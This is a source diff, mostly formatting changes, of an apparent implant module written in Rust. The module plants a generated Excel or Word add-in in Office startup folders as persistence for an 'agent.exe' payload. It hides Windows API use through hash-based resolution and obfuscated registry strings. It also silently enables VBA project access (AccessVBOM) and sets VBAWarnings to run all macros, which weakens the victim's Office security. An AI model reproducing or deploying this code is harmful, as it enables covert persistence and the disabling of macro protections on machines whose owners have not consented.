@@ -66,11 +66,11 @@ use std::path::{Path, PathBuf};
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
-use pe_resolve;
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
+use pe_resolve;
 
 // ═══════════════════════════════════════════════════════════════════════════
 // Constants
@@ -82,65 +82,244 @@ const DISC_VBA_VAR: u64 = 0xB00B;
 
 /// OneDrive registry subkey for Business1 UserFolder.
 const ONEDRIVE_BUSINESS1_W: &[u16] = &[
-    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
-    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
-    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
-    b'\\' as u16, b'O' as u16, b'n' as u16, b'e' as u16, b'D' as u16, b'r' as u16,
-    b'i' as u16, b'v' as u16, b'e' as u16, b'\\' as u16, b'A' as u16, b'c' as u16,
-    b'c' as u16, b'o' as u16, b'u' as u16, b'n' as u16, b't' as u16, b's' as u16,
-    b'\\' as u16, b'B' as u16, b'u' as u16, b's' as u16, b'i' as u16, b'n' as u16,
-    b'e' as u16, b's' as u16, b's' as u16, b'1' as u16,
+    b'S' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'w' as u16,
+    b'a' as u16,
+    b'r' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'M' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'r' as u16,
+    b'o' as u16,
+    b's' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'\\' as u16,
+    b'O' as u16,
+    b'n' as u16,
+    b'e' as u16,
+    b'D' as u16,
+    b'r' as u16,
+    b'i' as u16,
+    b'v' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'A' as u16,
+    b'c' as u16,
+    b'c' as u16,
+    b'o' as u16,
+    b'u' as u16,
+    b'n' as u16,
+    b't' as u16,
+    b's' as u16,
+    b'\\' as u16,
+    b'B' as u16,
+    b'u' as u16,
+    b's' as u16,
+    b'i' as u16,
+    b'n' as u16,
+    b'e' as u16,
+    b's' as u16,
+    b's' as u16,
+    b'1' as u16,
 ];
 
 /// OneDrive root registry path.
 const ONEDRIVE_ROOT_W: &[u16] = &[
-    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
-    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
-    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
-    b'\\' as u16, b'O' as u16, b'n' as u16, b'e' as u16, b'D' as u16, b'r' as u16,
-    b'i' as u16, b'v' as u16, b'e' as u16,
+    b'S' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'w' as u16,
+    b'a' as u16,
+    b'r' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'M' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'r' as u16,
+    b'o' as u16,
+    b's' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'\\' as u16,
+    b'O' as u16,
+    b'n' as u16,
+    b'e' as u16,
+    b'D' as u16,
+    b'r' as u16,
+    b'i' as u16,
+    b'v' as u16,
+    b'e' as u16,
 ];
 
 /// "UserFolder" wide constant for registry queries.
 const USER_FOLDER_W: &[u16] = &[
-    b'U' as u16, b's' as u16, b'e' as u16, b'r' as u16, b'F' as u16, b'o' as u16,
-    b'l' as u16, b'd' as u16, b'e' as u16, b'r' as u16,
+    b'U' as u16,
+    b's' as u16,
+    b'e' as u16,
+    b'r' as u16,
+    b'F' as u16,
+    b'o' as u16,
+    b'l' as u16,
+    b'd' as u16,
+    b'e' as u16,
+    b'r' as u16,
 ];
 
 /// Office Trust Center registry path for AccessVBOM.
 const TRUST_CENTER_W: &[u16] = &[
-    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
-    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
-    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
-    b'\\' as u16, b'O' as u16, b'f' as u16, b'f' as u16, b'i' as u16, b'c' as u16,
-    b'e' as u16, b'\\' as u16, b'1' as u16, b'6' as u16, b'.' as u16, b'0' as u16,
-    b'\\' as u16, b'C' as u16, b'o' as u16, b'm' as u16, b'm' as u16, b'o' as u16,
-    b'n' as u16, b'\\' as u16, b'S' as u16, b'e' as u16, b'c' as u16, b'u' as u16,
-    b'r' as u16, b'i' as u16, b't' as u16, b'y' as u16,
+    b'S' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'w' as u16,
+    b'a' as u16,
+    b'r' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'M' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'r' as u16,
+    b'o' as u16,
+    b's' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'\\' as u16,
+    b'O' as u16,
+    b'f' as u16,
+    b'f' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'1' as u16,
+    b'6' as u16,
+    b'.' as u16,
+    b'0' as u16,
+    b'\\' as u16,
+    b'C' as u16,
+    b'o' as u16,
+    b'm' as u16,
+    b'm' as u16,
+    b'o' as u16,
+    b'n' as u16,
+    b'\\' as u16,
+    b'S' as u16,
+    b'e' as u16,
+    b'c' as u16,
+    b'u' as u16,
+    b'r' as u16,
+    b'i' as u16,
+    b't' as u16,
+    b'y' as u16,
 ];
 
 /// Excel macro security registry path.
 const EXCEL_SECURITY_W: &[u16] = &[
-    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
-    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
-    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
-    b'\\' as u16, b'O' as u16, b'f' as u16, b'f' as u16, b'i' as u16, b'c' as u16,
-    b'e' as u16, b'\\' as u16, b'1' as u16, b'6' as u16, b'.' as u16, b'0' as u16,
-    b'\\' as u16, b'E' as u16, b'x' as u16, b'c' as u16, b'e' as u16, b'l' as u16,
-    b'\\' as u16, b'S' as u16, b'e' as u16, b'c' as u16, b'u' as u16, b'r' as u16,
-    b'i' as u16, b't' as u16, b'y' as u16,
+    b'S' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'w' as u16,
+    b'a' as u16,
+    b'r' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'M' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'r' as u16,
+    b'o' as u16,
+    b's' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'\\' as u16,
+    b'O' as u16,
+    b'f' as u16,
+    b'f' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'1' as u16,
+    b'6' as u16,
+    b'.' as u16,
+    b'0' as u16,
+    b'\\' as u16,
+    b'E' as u16,
+    b'x' as u16,
+    b'c' as u16,
+    b'e' as u16,
+    b'l' as u16,
+    b'\\' as u16,
+    b'S' as u16,
+    b'e' as u16,
+    b'c' as u16,
+    b'u' as u16,
+    b'r' as u16,
+    b'i' as u16,
+    b't' as u16,
+    b'y' as u16,
 ];
 
 /// Word macro security registry path.
 const WORD_SECURITY_W: &[u16] = &[
-    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
-    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
-    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
-    b'\\' as u16, b'O' as u16, b'f' as u16, b'f' as u16, b'i' as u16, b'c' as u16,
-    b'e' as u16, b'\\' as u16, b'1' as u16, b'6' as u16, b'.' as u16, b'0' as u16,
-    b'\\' as u16, b'W' as u16, b'o' as u16, b'r' as u16, b'd' as u16, b'\\' as u16,
-    b'S' as u16, b'e' as u16, b'c' as u16, b'u' as u16, b'r' as u16, b'i' as u16,
-    b't' as u16, b'y' as u16,
+    b'S' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'w' as u16,
+    b'a' as u16,
+    b'r' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'M' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'r' as u16,
+    b'o' as u16,
+    b's' as u16,
+    b'o' as u16,
+    b'f' as u16,
+    b't' as u16,
+    b'\\' as u16,
+    b'O' as u16,
+    b'f' as u16,
+    b'f' as u16,
+    b'i' as u16,
+    b'c' as u16,
+    b'e' as u16,
+    b'\\' as u16,
+    b'1' as u16,
+    b'6' as u16,
+    b'.' as u16,
+    b'0' as u16,
+    b'\\' as u16,
+    b'W' as u16,
+    b'o' as u16,
+    b'r' as u16,
+    b'd' as u16,
+    b'\\' as u16,
+    b'S' as u16,
+    b'e' as u16,
+    b'c' as u16,
+    b'u' as u16,
+    b'r' as u16,
+    b'i' as u16,
+    b't' as u16,
+    b'y' as u16,
 ];
 
 /// XLSTART / STARTUP folder names.
@@ -226,12 +405,32 @@ const DIR_BLACK: u8 = 1;
 // ── DLL wide strings for hash computation ────────────────────────────────
 
 const ADVAPI32_DLL_W: &[u16] = &[
-    b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16, b'p' as u16, b'i' as u16,
-    b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+    b'a' as u16,
+    b'd' as u16,
+    b'v' as u16,
+    b'a' as u16,
+    b'p' as u16,
+    b'i' as u16,
+    b'3' as u16,
+    b'2' as u16,
+    b'.' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
 ];
 const KERNEL32_DLL_W: &[u16] = &[
-    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16, b'l' as u16,
-    b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+    b'k' as u16,
+    b'e' as u16,
+    b'r' as u16,
+    b'n' as u16,
+    b'e' as u16,
+    b'l' as u16,
+    b'3' as u16,
+    b'2' as u16,
+    b'.' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
 ];
 
 const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
@@ -243,8 +442,7 @@ const HASH_REGCLOSEKEY: u32 = hash_str_const(b"RegCloseKey\0");
 const HASH_REGSETVALUEEXW: u32 = hash_str_const(b"RegSetValueExW\0");
 const HASH_REGCREATEKEYEXW: u32 = hash_str_const(b"RegCreateKeyExW\0");
 const HASH_GETENVIRONMENTVARIABLEW: u32 = hash_str_const(b"GetEnvironmentVariableW\0");
-const HASH_EXPANDENVIRONMENTSTRINGSW: u32 =
-    hash_str_const(b"ExpandEnvironmentStringsW\0");
+const HASH_EXPANDENVIRONMENTSTRINGSW: u32 = hash_str_const(b"ExpandEnvironmentStringsW\0");
 
 // ═══════════════════════════════════════════════════════════════════════════
 // Win32 type aliases
@@ -252,16 +450,9 @@ const HASH_EXPANDENVIRONMENTSTRINGSW: u32 =
 
 type HANDLE = *mut std::ffi::c_void;
 
-type FnRegOpenKeyExW =
-    unsafe extern "system" fn(HANDLE, *const u16, u32, u32, *mut HANDLE) -> i32;
-type FnRegQueryValueExW = unsafe extern "system" fn(
-    HANDLE,
-    *const u16,
-    *mut u32,
-    *mut u32,
-    *mut u8,
-    *mut u32,
-) -> i32;
+type FnRegOpenKeyExW = unsafe extern "system" fn(HANDLE, *const u16, u32, u32, *mut HANDLE) -> i32;
+type FnRegQueryValueExW =
+    unsafe extern "system" fn(HANDLE, *const u16, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
 type FnRegCloseKey = unsafe extern "system" fn(HANDLE) -> i32;
 type FnRegSetValueExW =
     unsafe extern "system" fn(HANDLE, *const u16, u32, u32, *const u8, u32) -> i32;
@@ -276,10 +467,8 @@ type FnRegCreateKeyExW = unsafe extern "system" fn(
     *mut HANDLE,
     *mut u32,
 ) -> i32;
-type FnGetEnvironmentVariableW =
-    unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
-type FnExpandEnvironmentStringsW =
-    unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
+type FnGetEnvironmentVariableW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
+type FnExpandEnvironmentStringsW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
 
 // ═══════════════════════════════════════════════════════════════════════════
 // API resolver
@@ -315,22 +504,10 @@ impl Api {
 
         Ok(Self {
             reg_open_key_ex_w: resolve!(advapi32, reg_open_key_ex_w, HASH_REGOPENKEYEXW)?,
-            reg_query_value_ex_w: resolve!(
-                advapi32,
-                reg_query_value_ex_w,
-                HASH_REGQUERYVALUEEXW
-            )?,
+            reg_query_value_ex_w: resolve!(advapi32, reg_query_value_ex_w, HASH_REGQUERYVALUEEXW)?,
             reg_close_key: resolve!(advapi32, reg_close_key, HASH_REGCLOSEKEY)?,
-            reg_set_value_ex_w: resolve!(
-                advapi32,
-                reg_set_value_ex_w,
-                HASH_REGSETVALUEEXW
-            )?,
-            reg_create_key_ex_w: resolve!(
-                advapi32,
-                reg_create_key_ex_w,
-                HASH_REGCREATEKEYEXW
-            )?,
+            reg_set_value_ex_w: resolve!(advapi32, reg_set_value_ex_w, HASH_REGSETVALUEEXW)?,
+            reg_create_key_ex_w: resolve!(advapi32, reg_create_key_ex_w, HASH_REGCREATEKEYEXW)?,
             get_environment_variable_w: resolve!(
                 kernel32,
                 get_environment_variable_w,
@@ -351,7 +528,10 @@ impl Api {
 
 /// Build a null-terminated UTF-16 vector from a Rust string.
 fn wide(s: &str) -> Vec<u16> {
-    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
+    OsStr::new(s)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect()
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -372,8 +552,7 @@ fn random_alphanum(discriminator: u64) -> String {
     use rand::prelude::*;
     let mut rng = rand::rngs::StdRng::seed_from_u64(ioc_seed() ^ discriminator);
     let len = rng.gen_range(8..=12);
-    const CHARSET: &[u8] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
     (0..len)
         .map(|_| CHARSET[rng.gen_range(0..CHARSET.len())] as char)
         .collect()
@@ -498,15 +677,9 @@ fn registry_onedrive_business_path(api: &Api) -> Option<PathBuf> {
         // Try Business1, Business2, etc.
         for idx in 1..=5u32 {
             let subkey = if idx == 1 {
-                format!(
-                    "Software\\Microsoft\\OneDrive\\Accounts\\Business{}",
-                    idx
-                )
+                format!("Software\\Microsoft\\OneDrive\\Accounts\\Business{}", idx)
             } else {
-                format!(
-                    "Software\\Microsoft\\OneDrive\\Accounts\\Business{}",
-                    idx
-                )
+                format!("Software\\Microsoft\\OneDrive\\Accounts\\Business{}", idx)
             };
             let subkey_wide: Vec<u16> = OsStr::new(&subkey)
                 .encode_wide()
@@ -526,8 +699,10 @@ fn registry_onedrive_business_path(api: &Api) -> Option<PathBuf> {
             }
 
             // Query UserFolder value.
-            let user_folder_name: Vec<u16> =
-                OsStr::new("UserFolder").encode_wide().chain(std::iter::once(0)).collect();
+            let user_folder_name: Vec<u16> = OsStr::new("UserFolder")
+                .encode_wide()
+                .chain(std::iter::once(0))
+                .collect();
             let mut buf = [0u16; 520];
             let mut buf_len = (buf.len() * 2) as u32;
             let mut reg_type: u32 = 0;
@@ -559,16 +734,12 @@ fn registry_onedrive_business_path(api: &Api) -> Option<PathBuf> {
             .chain(std::iter::once(0))
             .collect();
         let mut h_key: HANDLE = ptr::null_mut();
-        let result = (api.reg_open_key_ex_w)(
-            hklm,
-            subkey_wide.as_ptr(),
-            0,
-            0x0001,
-            &mut h_key,
-        );
+        let result = (api.reg_open_key_ex_w)(hklm, subkey_wide.as_ptr(), 0, 0x0001, &mut h_key);
         if result == 0 {
-            let user_folder_name: Vec<u16> =
-                OsStr::new("UserFolder").encode_wide().chain(std::iter::once(0)).collect();
+            let user_folder_name: Vec<u16> = OsStr::new("UserFolder")
+                .encode_wide()
+                .chain(std::iter::once(0))
+                .collect();
             let mut buf = [0u16; 520];
             let mut buf_len = (buf.len() * 2) as u32;
             let mut reg_type: u32 = 0;
@@ -633,11 +804,8 @@ fn filesystem_probe_onedrive(api: &Api) -> Option<PathBuf> {
             .chain(std::iter::once(0))
             .collect();
         let mut buf = [0u16; 520];
-        let len = (api.get_environment_variable_w)(
-            var_wide.as_ptr(),
-            buf.as_mut_ptr(),
-            buf.len() as u32,
-        );
+        let len =
+            (api.get_environment_variable_w)(var_wide.as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
         if len == 0 {
             return None;
         }
@@ -647,11 +815,7 @@ fn filesystem_probe_onedrive(api: &Api) -> Option<PathBuf> {
     let profile = PathBuf::from(user_profile);
 
     // Common OneDrive directory names.
-    let candidates = [
-        "OneDrive - Personal",
-        "OneDrive",
-        "OneDriveCommercial",
-    ];
+    let candidates = ["OneDrive - Personal", "OneDrive", "OneDriveCommercial"];
 
     // Also try to enumerate directories matching "OneDrive*" in the profile.
     if let Ok(entries) = std::fs::read_dir(&profile) {
@@ -757,8 +921,7 @@ fn string_to_chr_concat(s: &str) -> String {
 
 /// Minimal base64 encoder (no external crate).
 fn base64_encode(data: &[u8]) -> String {
-    const TABLE: &[u8; 64] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
     let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
     let chunks = data.chunks(3);
@@ -1003,9 +1166,9 @@ impl Ole2CompoundFile {
             name_utf16: encode_entry_name("Root Entry"),
             entry_type: DIR_ROOT,
             color: DIR_BLACK,
-            child: 1, // points to VBA
+            child: 1,        // points to VBA
             start_sector: 0, // will be updated
-            stream_size: 0, // will be updated to mini-stream size
+            stream_size: 0,  // will be updated to mini-stream size
             left_sibling: -1,
             right_sibling: -1,
             data: Vec::new(),
@@ -1038,10 +1201,18 @@ impl Ole2CompoundFile {
                 color: DIR_BLACK,
                 child: stream.child,
                 start_sector: 0, // will be updated
-                stream_size: if stream.is_storage { 0 } else { stream.data.len() as u32 },
+                stream_size: if stream.is_storage {
+                    0
+                } else {
+                    stream.data.len() as u32
+                },
                 left_sibling: if child_idx > 2 { -1 } else { -1 },
                 right_sibling: -1,
-                data: if stream.is_storage { Vec::new() } else { stream.data.clone() },
+                data: if stream.is_storage {
+                    Vec::new()
+                } else {
+                    stream.data.clone()
+                },
             });
             child_idx += 1;
         }
@@ -1060,11 +1231,14 @@ impl Ole2CompoundFile {
                 entries[i].start_sector = (mini_stream_data.len() / MINI_SECTOR_SIZE) as u32;
                 mini_sector_offsets.push(entries[i].start_sector);
                 // Pad to mini-sector boundary.
-                let padded_len =
-                    ((entries[i].data.len() + MINI_SECTOR_SIZE - 1) / MINI_SECTOR_SIZE)
-                        * MINI_SECTOR_SIZE;
+                let padded_len = ((entries[i].data.len() + MINI_SECTOR_SIZE - 1)
+                    / MINI_SECTOR_SIZE)
+                    * MINI_SECTOR_SIZE;
                 mini_stream_data.extend_from_slice(&entries[i].data);
-                mini_stream_data.resize(mini_stream_data.len() + padded_len - entries[i].data.len(), 0);
+                mini_stream_data.resize(
+                    mini_stream_data.len() + padded_len - entries[i].data.len(),
+                    0,
+                );
             }
         }
 
@@ -1082,7 +1256,8 @@ impl Ole2CompoundFile {
         // Sector 4: Mini-FAT (if needed)
         // Sector 5+: Regular stream data (> 4096 bytes)
 
-        let dir_sectors = ((entries.len() + DIR_ENTRIES_PER_SECTOR - 1) / DIR_ENTRIES_PER_SECTOR) as u32;
+        let dir_sectors =
+            ((entries.len() + DIR_ENTRIES_PER_SECTOR - 1) / DIR_ENTRIES_PER_SECTOR) as u32;
         let mini_stream_sectors =
             ((mini_stream_data.len() + SECTOR_SIZE - 1) / SECTOR_SIZE).max(1) as u32;
         let has_mini_fat = !mini_stream_data.is_empty();
@@ -1112,7 +1287,7 @@ impl Ole2CompoundFile {
         // Directory sectors.
         for i in 0..dir_sectors {
             let idx = dir_start_sector + i - 1; // FAT indices are 0-based but sectors are 1-based for fat
-            // Directory sectors start at sector 2 (FAT index 1 for dir_start_sector=2 → index 1)
+                                                // Directory sectors start at sector 2 (FAT index 1 for dir_start_sector=2 → index 1)
             let fat_idx = (dir_start_sector + i) as usize - 1;
             if i + 1 < dir_sectors {
                 fat[fat_idx] = (dir_start_sector + i + 1 - 1) as u32;
@@ -1165,7 +1340,9 @@ impl Ole2CompoundFile {
         output.extend_from_slice(&0u32.to_le_bytes()); // transaction signature
         output.extend_from_slice(&4096u32.to_le_bytes()); // mini stream cutoff
         output.extend_from_slice(&mini_stream_start.to_le_bytes()); // first mini-stream sector SID
-        output.extend_from_slice(&(mini_stream_data.len() as u32 / MINI_SECTOR_SIZE as u32).to_le_bytes()); // mini-stream size in sectors
+        output.extend_from_slice(
+            &(mini_stream_data.len() as u32 / MINI_SECTOR_SIZE as u32).to_le_bytes(),
+        ); // mini-stream size in sectors
         if has_mini_fat {
             output.extend_from_slice(&mini_fat_start.to_le_bytes()); // first mini-FAT sector
         } else {
@@ -1174,7 +1351,7 @@ impl Ole2CompoundFile {
         output.extend_from_slice(&1u32.to_le_bytes()); // total mini-FAT sectors
         output.extend_from_slice(&1u32.to_le_bytes()); // DIFAT first sector (FAT sector)
         output.extend_from_slice(&0u32.to_le_bytes()); // total DIFAT sectors
-        // DIFAT array (109 entries).
+                                                       // DIFAT array (109 entries).
         output.extend_from_slice(&fat_sector.to_le_bytes()); // DIFAT[0] = FAT sector
         for _ in 1..109 {
             output.extend_from_slice(&FAT_FREE.to_le_bytes());
@@ -1192,7 +1369,11 @@ impl Ole2CompoundFile {
         for entry in &entries {
             let mut dir_bytes = [0u8; 128];
             // Name (UTF-16, 64 bytes max).
-            let name_bytes: Vec<u8> = entry.name_utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
+            let name_bytes: Vec<u8> = entry
+                .name_utf16
+                .iter()
+                .flat_map(|c| c.to_le_bytes())
+                .collect();
             let name_len = name_bytes.len().min(62);
             dir_bytes[..name_len].copy_from_slice(&name_bytes[..name_len]);
             dir_bytes[64] = (name_len + 2) as u8; // name size in bytes (including null)
@@ -1218,8 +1399,7 @@ impl Ole2CompoundFile {
         output.resize(output.len() + dir_padded - dir_written, 0);
 
         // Mini-stream sector(s).
-        let mini_padded =
-            ((mini_stream_data.len() + SECTOR_SIZE - 1) / SECTOR_SIZE) * SECTOR_SIZE;
+        let mini_padded = ((mini_stream_data.len() + SECTOR_SIZE - 1) / SECTOR_SIZE) * SECTOR_SIZE;
         output.extend_from_slice(&mini_stream_data);
         output.resize(output.len() + mini_padded - mini_stream_data.len(), 0);
 
@@ -1504,8 +1684,10 @@ fn enable_access_vbom(api: &Api) -> Result<bool> {
         }
 
         // Set AccessVBOM = 1.
-        let value_name: Vec<u16> =
-            OsStr::new("AccessVBOM").encode_wide().chain(std::iter::once(0)).collect();
+        let value_name: Vec<u16> = OsStr::new("AccessVBOM")
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
         let data: u32 = 1;
         let result = (api.reg_set_value_ex_w)(
             h_key,
@@ -1555,8 +1737,10 @@ fn enable_macro_warnings(api: &Api, addin_type: AddinType) -> Result<bool> {
             bail!("RegCreateKeyExW for macro security failed: {}", result);
         }
 
-        let value_name: Vec<u16> =
-            OsStr::new("VBAWarnings").encode_wide().chain(std::iter::once(0)).collect();
+        let value_name: Vec<u16> = OsStr::new("VBAWarnings")
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
         let data: u32 = 1; // Enable all macros
         let result = (api.reg_set_value_ex_w)(
             h_key,
@@ -1587,14 +1771,15 @@ fn check_access_vbom(api: &Api) -> bool {
             .chain(std::iter::once(0))
             .collect();
 
-        let result =
-            (api.reg_open_key_ex_w)(hkcu, subkey.as_ptr(), 0, 0x0001, &mut h_key);
+        let result = (api.reg_open_key_ex_w)(hkcu, subkey.as_ptr(), 0, 0x0001, &mut h_key);
         if result != 0 {
             return false;
         }
 
-        let value_name: Vec<u16> =
-            OsStr::new("AccessVBOM").encode_wide().chain(std::iter::once(0)).collect();
+        let value_name: Vec<u16> = OsStr::new("AccessVBOM")
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
         let mut data: u32 = 0;
         let mut data_len = 4u32;
         let mut reg_type: u32 = 0;
@@ -1664,9 +1849,8 @@ pub fn install_office_addin(config: &OfficeAddinConfig) -> Result<AddinInstallRe
     let addin_path = target_dir.join(&filename);
 
     // 3. Create target directory.
-    std::fs::create_dir_all(target_dir).with_context(|| {
-        format!("failed to create directory: {}", target_dir.display())
-    })?;
+    std::fs::create_dir_all(target_dir)
+        .with_context(|| format!("failed to create directory: {}", target_dir.display()))?;
 
     // 4. Generate the add-in.
     let addin_data = match config.addin_type {
@@ -1677,16 +1861,18 @@ pub fn install_office_addin(config: &OfficeAddinConfig) -> Result<AddinInstallRe
     debug!("Generated {} add-in: {} bytes", extension, addin_data.len());
 
     // 5. Write the add-in file.
-    std::fs::write(&addin_path, &addin_data).with_context(|| {
-        format!("failed to write add-in: {}", addin_path.display())
-    })?;
+    std::fs::write(&addin_path, &addin_data)
+        .with_context(|| format!("failed to write add-in: {}", addin_path.display()))?;
 
     info!("Wrote add-in to {}", addin_path.display());
 
     // 6. Enable AccessVBOM and lower macro security.
     let access_vbom_set = match enable_access_vbom(&api) {
         Ok(created) => {
-            info!("AccessVBOM enabled (key {})", if created { "created" } else { "updated" });
+            info!(
+                "AccessVBOM enabled (key {})",
+                if created { "created" } else { "updated" }
+            );
             true
         }
         Err(e) => {
@@ -1697,7 +1883,10 @@ pub fn install_office_addin(config: &OfficeAddinConfig) -> Result<AddinInstallRe
 
     let macro_warnings_set = match enable_macro_warnings(&api, config.addin_type) {
         Ok(created) => {
-            info!("VBAWarnings set to 1 (key {})", if created { "created" } else { "updated" });
+            info!(
+                "VBAWarnings set to 1 (key {})",
+                if created { "created" } else { "updated" }
+            );
             true
         }
         Err(e) => {
@@ -1757,12 +1946,14 @@ pub fn verify_addin_persistence(config: &OfficeAddinConfig) -> Result<bool> {
     }
 
     // Check file has valid ZIP signature (PK\x03\x04).
-    let data = std::fs::read(&addin_path).with_context(|| {
-        format!("failed to read add-in: {}", addin_path.display())
-    })?;
+    let data = std::fs::read(&addin_path)
+        .with_context(|| format!("failed to read add-in: {}", addin_path.display()))?;
 
     if data.len() < 4 || &data[0..4] != &[0x50, 0x4B, 0x03, 0x04] {
-        warn!("Add-in file has invalid ZIP signature: {}", addin_path.display());
+        warn!(
+            "Add-in file has invalid ZIP signature: {}",
+            addin_path.display()
+        );
         return Ok(false);
     }
 
@@ -1818,9 +2009,8 @@ pub fn remove_office_addin(config: &OfficeAddinConfig) -> Result<()> {
     let addin_path = target_dir.join(&filename);
 
     if addin_path.exists() {
-        std::fs::remove_file(&addin_path).with_context(|| {
-            format!("failed to delete add-in: {}", addin_path.display())
-        })?;
+        std::fs::remove_file(&addin_path)
+            .with_context(|| format!("failed to delete add-in: {}", addin_path.display()))?;
         info!("Removed add-in: {}", addin_path.display());
     } else {
         debug!("Add-in file already absent: {}", addin_path.display());
@@ -1861,7 +2051,10 @@ mod tests {
 
     #[test]
     fn test_base64_encode_bytes() {
-        assert_eq!(base64_encode(b"any carnal pleasure."), "YW55IGNhcm5hbCBwbGVhc3VyZS4=");
+        assert_eq!(
+            base64_encode(b"any carnal pleasure."),
+            "YW55IGNhcm5hbCBwbGVhc3VyZS4="
+        );
     }
 
     #[test]
@@ -1892,7 +2085,10 @@ mod tests {
         // Check EOCD signature at end.
         assert!(data.len() >= 22);
         let eocd_offset = data.len() - 22;
-        assert_eq!(&data[eocd_offset..eocd_offset + 4], &[0x50, 0x4B, 0x05, 0x06]);
+        assert_eq!(
+            &data[eocd_offset..eocd_offset + 4],
+            &[0x50, 0x4B, 0x05, 0x06]
+        );
     }
 
     #[test]
@@ -1958,7 +2154,10 @@ mod tests {
         let header = build_vba_project_header();
         assert_eq!(header.len(), 16);
         // Check signature.
-        assert_eq!(u32::from_le_bytes(header[0..4].try_into().unwrap()), 0x000061CC);
+        assert_eq!(
+            u32::from_le_bytes(header[0..4].try_into().unwrap()),
+            0x000061CC
+        );
     }
 
     #[test]
@@ -2053,7 +2252,10 @@ mod tests {
         let json = serde_json::to_string(&config).unwrap();
         let deserialized: OfficeAddinConfig = serde_json::from_str(&json).unwrap();
         assert_eq!(deserialized.addin_type, AddinType::Excel);
-        assert_eq!(deserialized.payload_path, PathBuf::from(r"C:\test\agent.exe"));
+        assert_eq!(
+            deserialized.payload_path,
+            PathBuf::from(r"C:\test\agent.exe")
+        );
     }
 
     #[test]
